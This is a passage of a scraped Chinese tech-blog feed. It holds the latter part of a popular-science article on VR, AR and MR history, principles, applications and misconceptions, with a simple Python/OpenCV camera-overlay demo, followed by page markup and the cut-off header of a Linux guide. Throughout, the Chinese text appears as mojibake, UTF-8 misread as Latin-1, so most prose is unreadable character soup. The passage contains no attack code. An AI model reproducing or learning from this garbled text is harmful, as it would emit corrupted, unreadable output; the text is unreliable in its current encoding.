<p>è¿™å°±åƒ"ä¸€ä¸ªä¼šå‘å…‰çš„çº¢ç›’å­"ï¼Œè™½ç„¶æœ‰åˆ›æ–°ï¼Œä½†æŠ€æœ¯è¿˜ä¸æˆç†Ÿã€‚</p>
<h4 data-id="heading-6">3. ğŸš€ ç°ä»£VRï¼š"æ²‰æµ¸å¼ä½“éªŒ"ï¼ˆ2012-2016ï¼‰</h4>
<p>2012å¹´ï¼ŒOculus RiftåŸå‹æœºå‘å¸ƒï¼Œ2016å¹´æ­£å¼ä¸Šå¸‚ã€‚åŒå¹´ï¼ŒHTC Viveã€PlayStation VRä¹Ÿç›¸ç»§å‘å¸ƒï¼ŒVRè¿›å…¥äº†"é»„é‡‘æ—¶ä»£"ã€‚</p>
<p>è¿™å°±åƒ"æ‰“å¼€äº†è™šæ‹Ÿä¸–ç•Œçš„å¤§é—¨"ï¼Œäººä»¬ç¬¬ä¸€æ¬¡çœŸæ­£ä½“éªŒåˆ°äº†æ²‰æµ¸å¼VRï¼</p>
<h4 data-id="heading-7">4. ğŸŒˆ ARæŠ€æœ¯å…´èµ·ï¼š"è™šå®ç»“åˆ"ï¼ˆ2016-è‡³ä»Šï¼‰</h4>
<p>2016å¹´ï¼ŒPokemon Goçˆ†ç«ï¼Œè®©ARæŠ€æœ¯èµ°è¿›äº†å¤§ä¼—è§†é‡ã€‚åŒå¹´ï¼Œå¾®è½¯å‘å¸ƒäº†HoloLensï¼Œè¿™æ˜¯ç¬¬ä¸€å°çœŸæ­£çš„MRå¤´æ˜¾ã€‚</p>
<p>è¿™å°±åƒ"ç»™ç°å®ä¸–ç•ŒåŠ äº†ä¸€å±‚æ»¤é•œ"ï¼Œè™šæ‹Ÿå†…å®¹å’Œç°å®ä¸–ç•Œå®Œç¾ç»“åˆï¼</p>
<h4 data-id="heading-8">5. ğŸŒ XRèåˆï¼š"æœªæ¥å·²æ¥"ï¼ˆ2020-è‡³ä»Šï¼‰</h4>
<p>ç°åœ¨ï¼ŒVRå’ŒARæŠ€æœ¯æ­£åœ¨èåˆï¼Œå‡ºç°äº†è¶Šæ¥è¶Šå¤šçš„XRè®¾å¤‡ï¼Œæ¯”å¦‚Meta Quest 3ã€Apple Vision Proç­‰ï¼Œå®ƒä»¬æ—¢èƒ½æä¾›æ²‰æµ¸å¼VRä½“éªŒï¼Œä¹Ÿèƒ½æä¾›å‡ºè‰²çš„ARä½“éªŒã€‚</p>
<p>è¿™å°±åƒ"è§†è§‰æŠ€æœ¯çš„ç‘å£«å†›åˆ€"ï¼Œé›†å„ç§åŠŸèƒ½äºä¸€èº«ï¼</p>
<h3 data-id="heading-9">ğŸ”§ æŠ€æœ¯åŸç†ï¼šVRå’ŒARçš„æ ¸å¿ƒæŠ€æœ¯</h3>
<h4 data-id="heading-10">1. ğŸ® VRçš„æŠ€æœ¯åŸç†ï¼š"å®Œå…¨æ²‰æµ¸"</h4>
<p>VRçš„æ ¸å¿ƒæ˜¯<strong>æ²‰æµ¸å¼æ˜¾ç¤º</strong>ï¼Œé€šè¿‡ä»¥ä¸‹æŠ€æœ¯å®ç°ï¼š</p>
<ul>
<li>ğŸ–¥ï¸ <strong>åŒå±æ˜¾ç¤º</strong>ï¼šå·¦å³çœ¼æ˜¾ç¤ºç•¥æœ‰å·®å¼‚çš„ç”»é¢ï¼Œäº§ç”Ÿç«‹ä½“æ„Ÿ</li>
<li>ğŸ¯ <strong>å¤´éƒ¨è¿½è¸ª</strong>ï¼šå®æ—¶è¿½è¸ªå¤´éƒ¨ä½ç½®å’Œæ–¹å‘ï¼Œè°ƒæ•´æ˜¾ç¤ºå†…å®¹</li>
<li>ğŸ”Š <strong>ç©ºé—´éŸ³é¢‘</strong>ï¼šæ ¹æ®å¤´éƒ¨ä½ç½®è°ƒæ•´å£°éŸ³ï¼Œå¢å¼ºæ²‰æµ¸æ„Ÿ</li>
<li>ğŸ® <strong>äº¤äº’è®¾å¤‡</strong>ï¼šæ‰‹æŸ„ã€æ‰‹å¥—ã€èº«ä½“è¿½è¸ªå™¨ç­‰ï¼Œå®ç°è™šæ‹Ÿäº¤äº’</li>
</ul>
<h4 data-id="heading-11">2. ğŸ” ARçš„æŠ€æœ¯åŸç†ï¼š"è™šå®ç»“åˆ"</h4>
<p>ARçš„æ ¸å¿ƒæ˜¯<strong>åœ¨ç°å®ä¸–ç•Œä¸­å åŠ è™šæ‹Ÿå†…å®¹</strong>ï¼Œé€šè¿‡ä»¥ä¸‹æŠ€æœ¯å®ç°ï¼š</p>
<ul>
<li>ğŸ“· <strong>æ‘„åƒå¤´</strong>ï¼šæ•æ‰ç°å®ä¸–ç•Œç”»é¢</li>
<li>ğŸ“ <strong>ç©ºé—´å®šä½</strong>ï¼šé€šè¿‡SLAMï¼ˆåŒæ­¥å®šä½ä¸åœ°å›¾æ„å»ºï¼‰æŠ€æœ¯ï¼Œç¡®å®šè®¾å¤‡åœ¨ç©ºé—´ä¸­çš„ä½ç½®</li>
<li>ğŸ¨ <strong>è™šæ‹Ÿå åŠ </strong>ï¼šå°†è™šæ‹Ÿå†…å®¹ç²¾ç¡®åœ°å åŠ åˆ°ç°å®ä¸–ç•Œä¸­</li>
<li>âœ‹ <strong>æ‰‹åŠ¿è¯†åˆ«</strong>ï¼šè¯†åˆ«ç”¨æˆ·æ‰‹åŠ¿ï¼Œå®ç°è‡ªç„¶äº¤äº’</li>
</ul>
<h4 data-id="heading-12">3. ğŸŒ€ MRçš„æŠ€æœ¯åŸç†ï¼š"æ·±åº¦èåˆ"</h4>
<p>MRæ˜¯VRå’ŒARçš„ç»“åˆï¼Œå®ƒä¸ä»…èƒ½å åŠ è™šæ‹Ÿå†…å®¹ï¼Œè¿˜èƒ½è®©è™šæ‹Ÿå†…å®¹ä¸ç°å®ä¸–ç•Œäº¤äº’ï¼Œæ¯”å¦‚è™šæ‹Ÿç‰©ä½“èƒ½è¢«ç°å®ç‰©ä½“é®æŒ¡ï¼Œèƒ½ä¸ç°å®ç‰©ä½“äº’åŠ¨ã€‚</p>
<h4 data-id="heading-13">4. <strong>ä»£ç å®ä¾‹</strong>ï¼šç”¨Pythonå’ŒOpenCVæ¨¡æ‹Ÿç®€å•çš„ARæ•ˆæœ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> cv2
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># åŠ è½½å›¾åƒï¼ˆä½œä¸ºè™šæ‹Ÿå†…å®¹ï¼‰</span>
virtual_image = cv2.imread(<span class="hljs-string">'cat.png'</span>)
<span class="hljs-comment"># å¦‚æœæ²¡æœ‰cat.pngï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç ç”Ÿæˆä¸€ä¸ªå½©è‰²æ–¹å—</span>
<span class="hljs-comment"># virtual_image = np.zeros((100, 100, 3), dtype=np.uint8)</span>
<span class="hljs-comment"># virtual_image[:] = (0, 255, 0)  # ç»¿è‰²æ–¹å—</span>

<span class="hljs-comment"># åˆå§‹åŒ–æ‘„åƒå¤´</span>
cap = cv2.VideoCapture(<span class="hljs-number">0</span>)

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-comment"># è¯»å–æ‘„åƒå¤´ç”»é¢</span>
    ret, frame = cap.read()
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:
        <span class="hljs-keyword">break</span>
    
    <span class="hljs-comment"># è·å–ç”»é¢å°ºå¯¸</span>
    h, w, _ = frame.shape
    
    <span class="hljs-comment"># å®šä¹‰ARå†…å®¹çš„ä½ç½®ï¼ˆå±å¹•ä¸­å¤®ï¼‰</span>
    ar_x = w // <span class="hljs-number">2</span> - <span class="hljs-number">50</span>
    ar_y = h // <span class="hljs-number">2</span> - <span class="hljs-number">50</span>
    
    <span class="hljs-comment"># è°ƒæ•´è™šæ‹Ÿå›¾åƒå¤§å°</span>
    virtual_resized = cv2.resize(virtual_image, (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>))
    
    <span class="hljs-comment"># å°†è™šæ‹Ÿå›¾åƒå åŠ åˆ°ç°å®ç”»é¢ä¸­</span>
    <span class="hljs-comment"># ç®€å•çš„å åŠ ï¼Œä¸è€ƒè™‘é€æ˜åº¦</span>
    frame[ar_y:ar_y+<span class="hljs-number">100</span>, ar_x:ar_x+<span class="hljs-number">100</span>] = virtual_resized
    
    <span class="hljs-comment"># æ·»åŠ æ–‡å­—è¯´æ˜</span>
    cv2.putText(frame, <span class="hljs-string">"ARæ•ˆæœæ¼”ç¤º"</span>, (<span class="hljs-number">10</span>, <span class="hljs-number">30</span>), 
               cv2.FONT_HERSHEY_SIMPLEX, <span class="hljs-number">1</span>, (<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>), <span class="hljs-number">2</span>)
    cv2.putText(frame, <span class="hljs-string">"ç»¿è‰²æ–¹å—æ˜¯è™šæ‹Ÿå†…å®¹"</span>, (<span class="hljs-number">10</span>, <span class="hljs-number">60</span>), 
               cv2.FONT_HERSHEY_SIMPLEX, <span class="hljs-number">0.7</span>, (<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>), <span class="hljs-number">2</span>)
    
    <span class="hljs-comment"># æ˜¾ç¤ºç»“æœ</span>
    cv2.imshow(<span class="hljs-string">'AR Demo'</span>, frame)
    
    <span class="hljs-comment"># æŒ‰ESCé”®é€€å‡º</span>
    <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span> == <span class="hljs-number">27</span>:
        <span class="hljs-keyword">break</span>

<span class="hljs-comment"># é‡Šæ”¾èµ„æº</span>
cap.release()
cv2.destroyAllWindows()
</code></pre>
<p><strong>è¿è¡Œç»“æœ</strong>ï¼š</p>
<ul>
<li>æ‘„åƒå¤´ç”»é¢ä¸­å¤®ä¼šæ˜¾ç¤ºä¸€ä¸ªç»¿è‰²æ–¹å—ï¼ˆæˆ–åŠ è½½çš„å›¾ç‰‡ï¼‰ï¼Œä»¿ä½›å®ƒçœŸçš„åœ¨ç°å®ä¸–ç•Œä¸­</li>
<li>è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ARæ•ˆæœæ¼”ç¤ºï¼ŒçœŸå®çš„ARæŠ€æœ¯ä¼šæ›´å¤æ‚ï¼Œéœ€è¦ç©ºé—´å®šä½ã€SLAMç­‰æŠ€æœ¯</li>
</ul>
<h3 data-id="heading-14">ğŸ“Š è¶£å‘³å¯¹æ¯”ï¼šVR vs AR vs MR</h3>



























































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>VRï¼ˆè™šæ‹Ÿç°å®ï¼‰</th><th>ARï¼ˆå¢å¼ºç°å®ï¼‰</th><th>MRï¼ˆæ··åˆç°å®ï¼‰</th></tr></thead><tbody><tr><td><strong>æ ¸å¿ƒä½“éªŒ</strong></td><td>å®Œå…¨æ²‰æµ¸åœ¨è™šæ‹Ÿä¸–ç•Œ</td><td>åœ¨ç°å®ä¸–ç•Œä¸­å åŠ è™šæ‹Ÿå†…å®¹</td><td>è™šæ‹Ÿä¸ç°å®æ·±åº¦èåˆ</td></tr><tr><td><strong>è®¾å¤‡å½¢å¼</strong></td><td>å¤´æ˜¾ï¼ˆé®æŒ¡ç°å®ï¼‰</td><td>æ‰‹æœºã€çœ¼é•œï¼ˆé€æ˜æ˜¾ç¤ºï¼‰</td><td>é€æ˜å¤´æ˜¾</td></tr><tr><td><strong>äº¤äº’æ–¹å¼</strong></td><td>è™šæ‹Ÿæ‰‹æŸ„ã€æ‰‹åŠ¿</td><td>æ‰‹åŠ¿ã€è¯­éŸ³ã€è§¦æ‘¸</td><td>æ‰‹åŠ¿ã€è¯­éŸ³ã€ç°å®äº¤äº’</td></tr><tr><td><strong>ç©ºé—´æ„ŸçŸ¥</strong></td><td>è™šæ‹Ÿç©ºé—´</td><td>ç°å®ç©ºé—´+è™šæ‹Ÿå†…å®¹</td><td>ç°å®ç©ºé—´+è™šæ‹Ÿå†…å®¹+äº¤äº’</td></tr><tr><td><strong>ä»£è¡¨äº§å“</strong></td><td>Oculus Questã€HTC Vive</td><td>æ‰‹æœºARã€Google Glass</td><td>HoloLensã€Magic Leap</td></tr><tr><td><strong>å…¸å‹åº”ç”¨</strong></td><td>æ¸¸æˆã€è™šæ‹Ÿæ—…æ¸¸ã€åŸ¹è®­</td><td>å¯¼èˆªã€æ•™è‚²ã€è´­ç‰©</td><td>å·¥ä¸šè®¾è®¡ã€åŒ»ç–—æ‰‹æœ¯ã€ç»´ä¿®</td></tr><tr><td><strong>æŠ€æœ¯éš¾åº¦</strong></td><td>ä¸­</td><td>é«˜</td><td>æé«˜</td></tr><tr><td><strong>å¸‚åœºæˆç†Ÿåº¦</strong></td><td>è¾ƒæˆç†Ÿ</td><td>å¿«é€Ÿå‘å±•</td><td>èµ·æ­¥é˜¶æ®µ</td></tr></tbody></table>
<h3 data-id="heading-15">ğŸ¢ VRå’ŒARçš„åº”ç”¨åœºæ™¯ï¼š"æ”¹å˜å„è¡Œå„ä¸š"</h3>
<p>VRå’ŒARå·²ç»æ¸—é€åˆ°æˆ‘ä»¬ç”Ÿæ´»çš„æ–¹æ–¹é¢é¢ï¼Œè¢«ç§°ä¸º"ä¸‹ä¸€ä»£è®¡ç®—å¹³å°"ï¼š</p>


















































<table><thead><tr><th>åº”ç”¨é¢†åŸŸ</th><th>VRåº”ç”¨</th><th>ARåº”ç”¨</th></tr></thead><tbody><tr><td>ğŸ® <strong>æ¸¸æˆå¨±ä¹</strong></td><td>æ²‰æµ¸å¼æ¸¸æˆã€è™šæ‹Ÿæ¼”å”±ä¼š</td><td>Pokemon Goã€ARæ»¤é•œã€è™šæ‹Ÿå® ç‰©</td></tr><tr><td>ğŸ« <strong>æ•™è‚²</strong></td><td>è™šæ‹Ÿè¯¾å ‚ã€å†å²é‡ç°ã€ç§‘å­¦å®éªŒ</td><td>3Dæ¨¡å‹å±•ç¤ºã€äº¤äº’å¼å­¦ä¹ ã€è™šæ‹Ÿæ•™å…·</td></tr><tr><td>ğŸ¥ <strong>åŒ»ç–—å¥åº·</strong></td><td>æ‰‹æœ¯åŸ¹è®­ã€å¿ƒç†æ²»ç–—ã€ç–¼ç—›ç®¡ç†</td><td>æ‰‹æœ¯å¯¼èˆªã€åŒ»å­¦å½±åƒå åŠ ã€è¿œç¨‹åŒ»ç–—</td></tr><tr><td>ğŸ­ <strong>å·¥ä¸šåˆ¶é€ </strong></td><td>è™šæ‹Ÿè®¾è®¡ã€å·¥å‚æ¨¡æ‹Ÿã€å‘˜å·¥åŸ¹è®­</td><td>è®¾å¤‡ç»´ä¿®ã€é›¶ä»¶è¯†åˆ«ã€è£…é…æŒ‡å¯¼</td></tr><tr><td>ğŸ›ï¸ <strong>é›¶å”®è´­ç‰©</strong></td><td>è™šæ‹Ÿè¯•è¡£ã€è™šæ‹Ÿå±•å…ã€å®¶å±…è®¾è®¡</td><td>è™šæ‹Ÿè¯•å¦†ã€ARå¯¼è´­ã€äº§å“ä¿¡æ¯æŸ¥è¯¢</td></tr><tr><td>ğŸ—ºï¸ <strong>å¯¼èˆªå‡ºè¡Œ</strong></td><td>è™šæ‹Ÿé©¾é©¶ã€é£è¡Œæ¨¡æ‹Ÿã€è™šæ‹Ÿæ—…æ¸¸</td><td>å®æ—¶å¯¼èˆªã€æ™¯ç‚¹ä»‹ç»ã€ARç¿»è¯‘</td></tr><tr><td>ğŸ‘· <strong>å»ºç­‘å·¥ç¨‹</strong></td><td>è™šæ‹Ÿå»ºç­‘ã€æ–½å·¥æ¨¡æ‹Ÿã€å®‰å…¨åŸ¹è®­</td><td>å»ºç­‘è®¾è®¡å¯è§†åŒ–ã€æ–½å·¥è¿›åº¦ç›‘æ§</td></tr><tr><td>ğŸ¬ <strong>å½±è§†ä¼ åª’</strong></td><td>360Â°è§†é¢‘ã€è™šæ‹Ÿå½±é™¢</td><td>ARå¹¿å‘Šã€äº¤äº’å¼ç”µå½±ã€è™šæ‹Ÿè§’è‰²</td></tr></tbody></table>
<h3 data-id="heading-16">âš ï¸ å¸¸è§è¯¯åŒºçº æ­£</h3>
<h4 data-id="heading-17">1. "VRå’ŒARæ˜¯ä¸€å›äº‹ï¼Ÿ"</h4>
<p>ä¸ï¼VRæ˜¯å®Œå…¨æ²‰æµ¸åœ¨è™šæ‹Ÿä¸–ç•Œï¼ŒARæ˜¯åœ¨ç°å®ä¸–ç•Œå åŠ è™šæ‹Ÿå†…å®¹ï¼Œå®ƒä»¬çš„æ ¸å¿ƒä½“éªŒå’ŒæŠ€æœ¯åŸç†éƒ½ä¸åŒã€‚</p>
<h4 data-id="heading-18">2. "VRä¼šè®©äººä¸Šç˜¾ï¼Ÿ"</h4>
<p>ä¸ä¸€å®šï¼VRåªæ˜¯ä¸€ç§æŠ€æœ¯ï¼Œå°±åƒæ‰‹æœºã€ç”µè„‘ä¸€æ ·ï¼Œåˆç†ä½¿ç”¨ä¸ä¼šä¸Šç˜¾ã€‚ä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šå¯¼è‡´çœ¼ç›ç–²åŠ³ã€å¤´æ™•ç­‰ä¸é€‚ã€‚</p>
<h4 data-id="heading-19">3. "ARæŠ€æœ¯è¿˜ä¸æˆç†Ÿï¼Ÿ"</h4>
<p>ä¸ï¼ARæŠ€æœ¯å·²ç»å¾ˆæˆç†Ÿäº†ï¼Œæ¯”å¦‚æ‰‹æœºARã€Google Lensç­‰ï¼Œéƒ½å·²ç»å¹¿æ³›åº”ç”¨ã€‚åªæ˜¯MRæŠ€æœ¯è¿˜åœ¨å‘å±•ä¸­ã€‚</p>
<h4 data-id="heading-20">4. "VRå¤´æ˜¾å¾ˆé‡ï¼Ÿ"</h4>
<p>æ—©æœŸçš„VRå¤´æ˜¾ç¡®å®å¾ˆé‡ï¼Œä½†ç°åœ¨çš„å¤´æ˜¾å·²ç»å¾ˆè½»ä¾¿äº†ï¼Œæ¯”å¦‚Meta Quest 3åªæœ‰515å…‹ï¼Œæ¯”å¾ˆå¤šæ‰‹æœºè¿˜è½»ã€‚</p>
<h4 data-id="heading-21">5. "ARå¿…é¡»æˆ´çœ¼é•œï¼Ÿ"</h4>
<p>ä¸ï¼æ‰‹æœºARä¸éœ€è¦æˆ´çœ¼é•œï¼Œåªéœ€è¦ç”¨æ‰‹æœºæ‘„åƒå¤´å°±èƒ½ä½“éªŒã€‚å½“ç„¶ï¼ŒARçœ¼é•œä¼šæä¾›æ›´å¥½çš„ä½“éªŒã€‚</p>
<h4 data-id="heading-22">6. "VRä¼šä¼¤å®³çœ¼ç›ï¼Ÿ"</h4>
<p>åˆç†ä½¿ç”¨ä¸ä¼šï¼VRå¤´æ˜¾éƒ½æœ‰è“å…‰è¿‡æ»¤ã€è‡ªåŠ¨äº®åº¦è°ƒèŠ‚ç­‰åŠŸèƒ½ï¼Œåªè¦æ§åˆ¶ä½¿ç”¨æ—¶é—´ï¼Œä¸ä¼šä¼¤å®³çœ¼ç›ã€‚</p>
<h3 data-id="heading-23">ğŸ”® æœªæ¥å±•æœ›ï¼šVRå’ŒARçš„å‘å±•è¶‹åŠ¿</h3>
<h4 data-id="heading-24">1. ğŸ“± <strong>æ›´è½»ä¾¿çš„è®¾å¤‡</strong></h4>
<p>æœªæ¥çš„VR/ARè®¾å¤‡ä¼šè¶Šæ¥è¶Šè½»ä¾¿ï¼Œç”šè‡³å¯èƒ½åƒæ™®é€šçœ¼é•œä¸€æ ·ï¼Œä½©æˆ´èˆ’é€‚ï¼Œå¤–è§‚æ—¶å°šã€‚</p>
<h4 data-id="heading-25">2. ğŸ¤– <strong>æ›´æ™ºèƒ½çš„äº¤äº’</strong></h4>
<p>æ‰‹åŠ¿è¯†åˆ«ã€è¯­éŸ³è¯†åˆ«ã€çœ¼åŠ¨è¿½è¸ªç­‰æŠ€æœ¯ä¼šè¶Šæ¥è¶Šæˆç†Ÿï¼Œäº¤äº’ä¼šå˜å¾—æ›´åŠ è‡ªç„¶ï¼Œç”šè‡³ä¸éœ€è¦æ‰‹æŸ„ã€‚</p>
<h4 data-id="heading-26">3. ğŸŒ <strong>æ›´ä¸°å¯Œçš„å†…å®¹</strong></h4>
<p>éšç€æŠ€æœ¯çš„å‘å±•ï¼ŒVR/ARå†…å®¹ä¼šè¶Šæ¥è¶Šä¸°å¯Œï¼Œä»æ¸¸æˆåˆ°æ•™è‚²ï¼Œä»å¨±ä¹åˆ°å·¥ä½œï¼Œæ¶µç›–å„ä¸ªé¢†åŸŸã€‚</p>
<h4 data-id="heading-27">4. ğŸ”— <strong>æ›´å¥½çš„äº’è”æ€§</strong></h4>
<p>VR/ARè®¾å¤‡ä¼šä¸æ‰‹æœºã€ç”µè„‘ã€æ™ºèƒ½å®¶å±…ç­‰è®¾å¤‡æ›´å¥½åœ°äº’è”ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„ç”Ÿæ€ç³»ç»Ÿã€‚</p>
<h4 data-id="heading-28">5. ğŸ“Š <strong>æ›´å¹¿æ³›çš„åº”ç”¨</strong></h4>
<p>VR/ARæŠ€æœ¯ä¼šåº”ç”¨åˆ°æ›´å¤šé¢†åŸŸï¼Œæ¯”å¦‚è¿œç¨‹åŠå…¬ã€è™šæ‹Ÿä¼šè®®ã€æ•°å­—å­ªç”Ÿç­‰ï¼Œæˆä¸ºæˆ‘ä»¬ç”Ÿæ´»å’Œå·¥ä½œçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚</p>
<h4 data-id="heading-29">6. ğŸ’° <strong>æ›´ä½çš„ä»·æ ¼</strong></h4>
<p>éšç€æŠ€æœ¯çš„æˆç†Ÿå’Œé‡äº§ï¼ŒVR/ARè®¾å¤‡çš„ä»·æ ¼ä¼šè¶Šæ¥è¶Šä½ï¼Œæ™®åŠåº¦ä¼šè¶Šæ¥è¶Šé«˜ã€‚</p>
<h3 data-id="heading-30">ğŸ“ äº’åŠ¨å°æµ‹éªŒï¼šä½ ç­”å¯¹äº†å—ï¼Ÿ</h3>


















































<table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th><th>ä½ ç­”å¯¹äº†å—ï¼Ÿ</th></tr></thead><tbody><tr><td>VRçš„æ ¸å¿ƒæ˜¯ä»€ä¹ˆï¼Ÿ</td><td>æ²‰æµ¸å¼æ˜¾ç¤º</td><td>âœ…/âŒ</td></tr><tr><td>ARçš„æ ¸å¿ƒæ˜¯ä»€ä¹ˆï¼Ÿ</td><td>åœ¨ç°å®ä¸–ç•Œä¸­å åŠ è™šæ‹Ÿå†…å®¹</td><td>âœ…/âŒ</td></tr><tr><td>MRæ˜¯VRå’ŒARçš„ç»“åˆå—ï¼Ÿ</td><td>æ˜¯çš„</td><td>âœ…/âŒ</td></tr><tr><td>2025å¹´VR/ARå¸‚åœºè§„æ¨¡é¢„è®¡æ˜¯å¤šå°‘ï¼Ÿ</td><td>2500äº¿ç¾å…ƒ</td><td>âœ…/âŒ</td></tr><tr><td>ARè®¾å¤‡å‡ºè´§é‡ä¼šè¶…è¿‡VRè®¾å¤‡å—ï¼Ÿ</td><td>æ˜¯çš„</td><td>âœ…/âŒ</td></tr><tr><td>SLAMæŠ€æœ¯åœ¨VR/ARä¸­çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>ç©ºé—´å®šä½</td><td>âœ…/âŒ</td></tr><tr><td>ä»£è¡¨MRè®¾å¤‡çš„æ˜¯ï¼Ÿ</td><td>HoloLens</td><td>âœ…/âŒ</td></tr><tr><td>VRå¤´æ˜¾ä¼šé®æŒ¡ç°å®ä¸–ç•Œå—ï¼Ÿ</td><td>æ˜¯çš„</td><td>âœ…/âŒ</td></tr></tbody></table>
<h3 data-id="heading-31">ğŸ¯ ç»“è¯­ï¼šè§†è§‰é©å‘½çš„æœªæ¥</h3>
<p>VRå’ŒARæŠ€æœ¯æ­£åœ¨æ”¹å˜æˆ‘ä»¬æ„ŸçŸ¥ä¸–ç•Œçš„æ–¹å¼ï¼Œä»å®Œå…¨è™šæ‹Ÿåˆ°è™šå®ç»“åˆï¼Œå†åˆ°æ·±åº¦èåˆï¼Œå®ƒä»¬è®©æˆ‘ä»¬çš„ç”Ÿæ´»å’Œå·¥ä½œå˜å¾—æ›´åŠ ä¸°å¯Œå¤šå½©ã€‚</p>
<p>è™½ç„¶VRå’ŒARè¿˜æœ‰ä¸€äº›æŒ‘æˆ˜éœ€è¦å…‹æœï¼Œæ¯”å¦‚è®¾å¤‡é‡é‡ã€å†…å®¹è´¨é‡ã€ä»·æ ¼ç­‰ï¼Œä½†éšç€æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼Œå®ƒä»¬ä¸€å®šä¼šæˆä¸ºæˆ‘ä»¬ç”Ÿæ´»ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚</p>
<p>ä¸‹æ¬¡å½“ä½ ä½¿ç”¨VRå¤´æ˜¾æ‰“æ¸¸æˆï¼Œæˆ–è€…ç”¨æ‰‹æœºä½“éªŒARæ•ˆæœæ—¶ï¼Œä¸å¦¨æƒ³æƒ³èƒŒåçš„æŠ€æœ¯åŸç†ï¼Œæ„Ÿå—ä¸€ä¸‹è§†è§‰é©å‘½çš„é­…åŠ›ï¼</p>
<hr/>
<h3 data-id="heading-32">ğŸ’¬ äº’åŠ¨è¯é¢˜</h3>
<ol>
<li>ä½ ä½“éªŒè¿‡VRæˆ–ARå—ï¼Ÿæ„Ÿè§‰å¦‚ä½•ï¼Ÿ</li>
<li>ä½ è§‰å¾—VRå’ŒARå“ªä¸ªæ›´æœ‰å‰é€”ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</li>
<li>ä½ æœ€æœŸå¾…VR/ARåœ¨å“ªä¸ªé¢†åŸŸçš„åº”ç”¨ï¼Ÿ</li>
<li>ä½ ä¼šè´­ä¹°Apple Vision Proæˆ–Meta Quest 3å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</li>
</ol>
<p>å¿«æ¥è¯„è®ºåŒºèŠèŠä½ çš„æƒ³æ³•ï¼ğŸ’¬ ç‚¹èµæ”¶è—ä¸è¿·è·¯ï¼Œå’±ä»¬ä¸‹æœŸç»§ç»­æ¢ç´¢è®¡ç®—æœºçš„"åä¸‡ä¸ªä¸ºä»€ä¹ˆ"ï¼ğŸ‰</p>
<p><strong>å…³æ³¨æˆ‘</strong>ï¼Œä¸‹æœŸå¸¦ä½ è§£é”æ›´å¤šè®¡ç®—æœºçš„"å¥‡è‘©å†·çŸ¥è¯†"ï¼ğŸ¤“</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux ä»å…¥é—¨åˆ°å®æˆ˜ï¼šå¸¸ç”¨æŒ‡ä»¤ä¸ C è¯­è¨€å¼€å‘å…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7588139768275075123</link>    <guid>https://juejin.cn/post/7588139768275075123</guid>    <pubDate>2025-12-28T02:08:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588139768275075123" data-draft-id="7588080521445703726" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux ä»å…¥é—¨åˆ°å®æˆ˜ï¼šå¸¸ç”¨æŒ‡ä»¤ä¸ C è¯­è¨€å¼€å‘å…¨æŒ‡å—"/> <meta itemprop="keywords" content="Linux"/> <meta itemprop="datePublished" content="2025-12-28T02:08:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æ¨åŒå­¦49"/> <meta itemprop="url" content="https://juejin.cn/user/1189004976589664"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux ä»å…¥é—¨åˆ°å®æˆ˜ï¼šå¸¸ç”¨æŒ‡ä»¤ä¸ C è¯­è¨€å¼€å‘å…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1189004976589664/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æ¨åŒå­¦49
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T02:08:28.000Z" title="Sun Dec 28 2025 02:08:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
